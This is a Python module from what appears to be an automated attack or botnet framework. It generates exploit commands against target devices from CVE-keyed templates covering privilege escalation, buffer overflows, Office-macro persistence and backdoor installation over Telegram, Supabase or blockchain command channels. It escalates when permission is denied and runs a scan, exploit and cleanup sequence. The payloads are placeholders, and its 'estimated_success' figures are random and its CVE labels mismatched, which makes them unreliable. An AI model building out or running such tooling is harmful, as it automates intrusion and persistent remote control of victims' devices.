import json
import time
import logging
import hashlib
import random
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)

class AICommandGenerator:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.generated_commands = []
        self.templates = self._load_templates()
        self.max_variants = config.get("max_variants", 3)
        self.orchestrator = None
        self.analyzer = None
        self.validator = None
        self.error_tracker = None
        self.crypto_manager = None
        self.feature_discovery = None
        self.supabase_sync = None
        self.predictive_scheduler = None

    def set_orchestrator(self, orch):
        self.orchestrator = orch

    def set_analyzer(self, analyzer):
        self.analyzer = analyzer

    def set_validator(self, validator):
        self.validator = validator

    def set_error_tracker(self, tracker):
        self.error_tracker = tracker

    def set_crypto_manager(self, crypto):
        self.crypto_manager = crypto

    def set_feature_discovery(self, fd):
        self.feature_discovery = fd

    def set_supabase_sync(self, sync):
        self.supabase_sync = sync

    def set_predictive_scheduler(self, scheduler):
        self.predictive_scheduler = scheduler

    def _load_templates(self) -> Dict:
        return {
            "CVE-2026-22769": {
                "type": "privilege_escalation",
                "base_cmd": "auto_root",
                "variants": ["dirtypipe", "cve2025", "method1"]
            },
            "CVE-2025-48593": {
                "type": "buffer_overflow",
                "base_cmd": "exploit_dell",
                "variants": ["rop", "jmp_esp", "ret2libc"]
            },
            "CVE-2026-21509": {
                "type": "persistence",
                "base_cmd": "office_exploit",
                "variants": ["macro", "dde", "ole"]
            },
            "CVE-2026-30124": {
                "type": "c2_communication",
                "base_cmd": "backdoor_install",
                "variants": ["telegram", "supabase", "blockchain"]
            }
        }

    def process_task(self, task_type: str, data: Any) -> Dict[str, Any]:
        if task_type == "generate_exploit":
            return self.generate_exploit(data)
        elif task_type == "generate_fallback":
            return self.generate_fallback(data.get("device_id"), data.get("command"), data.get("params"), data.get("error_code"))
        elif task_type == "generate_command":
            return {"command": self.generate_command(data.get("context"))}
        elif task_type == "generate_complex_payload":
            return self.generate_complex_payload(data.get("analysis_results"))
        return {"error": f"Unknown task type: {task_type}"}

    def generate_command(self, context: Optional[Dict] = None) -> str:
        try:
            logger.info("Generator: Generating dynamic command...")
            template_keys = list(self.templates.keys())
            if not template_keys:
                return "echo no_templates"
            chosen_key = random.choice(template_keys)
            template_info = self.templates[chosen_key]
            base = template_info["base_cmd"]
            variant = random.choice(template_info["variants"])
            target = context.get("target", f"dev_{random.randint(1000,9999)}") if context else f"dev_{random.randint(1000,9999)}"
            port = random.randint(1024, 65535)
            file_name = f"data_{random.randint(1,100)}.db"
            dest = f"srv_{random.randint(1,5)}.com"
            method = random.choice(template_info["variants"])
            version = round(random.uniform(1.0, 5.0), 2)
            command = f"{base}_{variant} --target {target} --port {port} --file {file_name} --dest {dest} --method {method} --version {version}"
            logger.info(f"Generated command: {command}")
            return command
        except Exception as e:
            if self.error_tracker:
                self.error_tracker.log_error("system", "GENERATE_CMD_ERR", str(e), module="generator")
            return f"error generating command: {e}"

    def generate_exploit(self, analysis_result: Dict) -> Dict[str, Any]:
        device_id = analysis_result.get("device_id")
        vuln_type = analysis_result.get("vulnerability_type")
        confidence = analysis_result.get("confidence", 0.0)
        if not vuln_type or confidence < 0.8:
            return {"error": "Insufficient confidence or missing vulnerability type"}
        template = self.templates.get(vuln_type)
        if not template:
            return {"error": f"No template for {vuln_type}"}
        exploit_variants = []
        base_cmd = template["base_cmd"]
        for variant in template["variants"][:self.max_variants]:
            cmd_name = f"{base_cmd}_{variant}_{int(time.time())}"
            cmd_code = self._create_command_template(vuln_type, variant, device_id)
            exploit_variants.append({
                "name": cmd_name,
                "variant": variant,
                "code": cmd_code,
                "estimated_success": random.uniform(0.7, 0.95)
            })
        selected = self._select_best_exploit(exploit_variants)
        result = {
            "device_id": device_id,
            "vulnerability": vuln_type,
            "generated_at": time.time(),
            "variants": exploit_variants,
            "selected": selected,
            "command_name": selected["name"],
            "exploit_code": selected["code"]
        }
        self.generated_commands.append(result)
        if len(self.generated_commands) > 200:
            self.generated_commands.pop(0)
        logger.info(f"Generated exploit for {device_id}: {selected['name']}")
        if self.supabase_sync:
            cmd_data = {
                "name": selected["name"],
                "description": f"Exploit for {vuln_type} using {selected['variant']}",
                "type": template["type"],
                "requires_ai": True,
                "params": {}
            }
            self.supabase_sync.add_command(cmd_data)
        if self.feature_discovery:
            self.feature_discovery.scan_for_new_features("ai_generated_commands", [cmd_data])
        if self.predictive_scheduler:
            self.predictive_scheduler.schedule_task(device_id, selected["name"], result)
        if self.crypto_manager and self.crypto_manager.encrypt:
            result["encrypted"] = self.crypto_manager.encrypt(json.dumps(result).encode()).hex()
        return result

    def generate_fallback(self, device_id: str, original_command: str, params: Dict, error_code: str) -> Optional[str]:
        logger.info(f"Generating fallback for {device_id}, command {original_command}, error {error_code}")
        if error_code == "TIMEOUT":
            return f"{original_command}_retry"
        elif error_code == "PERMISSION_DENIED":
            return f"escalate_{original_command}"
        else:
            return f"{original_command}_alt"

    def generate_complex_payload(self, analysis_results: Optional[Dict] = None) -> Dict:
        logger.info("Generator: Generating complex payload based on analysis...")
        if analysis_results:
            return {"action": "complex_task", "sequence": ["cmd1", "cmd2"], "based_on": analysis_results}
        return {"action": "default_complex", "sequence": ["scan", "exploit", "cleanup"]}

    def _create_command_template(self, vuln_type: str, variant: str, device_id: str) -> str:
        base = f"cmd_{vuln_type}_{variant}"
        payload = f"{{'target':'{device_id}','method':'{variant}','params':{{}}}}"
        return f"{base}|{payload}"

    def _select_best_exploit(self, variants: List[Dict]) -> Dict:
        return max(variants, key=lambda x: x["estimated_success"])

    def get_statistics(self) -> Dict:
        return {
            "total_generated": len(self.generated_commands),
            "recent": self.generated_commands[-10:] if self.generated_commands else []
        }